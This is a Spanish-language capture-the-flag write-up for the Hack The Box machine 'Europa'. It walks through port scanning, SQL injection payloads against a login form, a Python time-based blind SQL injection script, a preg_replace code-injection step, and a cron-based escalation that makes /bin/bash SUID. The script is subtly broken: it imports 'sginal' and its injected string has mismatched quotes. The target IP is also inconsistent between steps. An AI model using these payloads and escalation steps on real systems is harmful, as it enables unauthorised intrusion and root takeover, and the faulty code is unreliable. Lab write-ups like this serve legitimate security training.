---
title: "Europe"
description: "Europe"
pubDate: 2025-05-20
---

https://app.hackthebox.com/machines/Europa

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.10.22
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250221105016.png)

## Reconocimiento de servicios

````
nmap -sCV -p22,80,443 10.10.10.22
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250221105129.png)

## Fuzz

````
openssl s_client -connect 10.10.11.110:443
````

Vemos una direccion DNS y un usuario
Encontramos un panel de autenticación en la direccion

# Fase de ataque

## SQLI

Con burpsuite probamos SQLI

````
email=admin@europacorp.htb' order by 100-- -&password=aa
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250221114855.png)
Parece vulnerable a SQLI

Encontramos las columnas

````
email=admin@europacorp.htb' order by 5-- -&password=aa
````

### Time based Sleep database leak (Inyeccion basada en tiempo)

Cuando al intentar listar contenido en algún campo de la web y no sale nada, utilizamos esta técnica para enumerar

````python
#!/usr/bin/python3

from pwn import *
import requests, sys, sginal, time, pdb, urllib3, string

urllib3.disable_warnings();

def def_handler(sig, frame):
    print("\n\nSaliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

login_url = "https://admin.portal.europacorp.htb/login.php"
characters = string.ascii_lowercase

def SQLI():
    s = requests.session()
    s.verify = False

    for position in range(1,10):
        for character in characters:
            post_data = {
            'email': 'admin@europacorp.htb' and if (substr(database(),%d,1)='%s',sleep(5),1)-- -" % (position, character),
            'password': 'aa'
            }

            time_start = time.time()
            r = s.post(login_url, data=post_data)
            time_end = time.time()

            if time_end - time_start > 5:
                print ("El caracter es %s" % character)
                break

if __name__ == '__main__':
    SQLI()
````

++++

## Web

Interceptamos la conexion por burpsuite
Puedes cambair el ip_address en un sito de la web, esto usa regex y preg_replace y se puede hacer que lo sustituya por php malicioso
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020250221145805.png)
\[-\] ==pwned!==

# Privilege Escalation

En crontab hay un archivo que se ejecuta

````
cat /etc/crontab
````

Editamos el archivo que ejecuta y hacemos bash SUID

````bash
#!/bin/bash

chmod u+s /bin/bash
````

Ejecutamos la bash

````
bash -p
````

\[+\] ==pwned!==
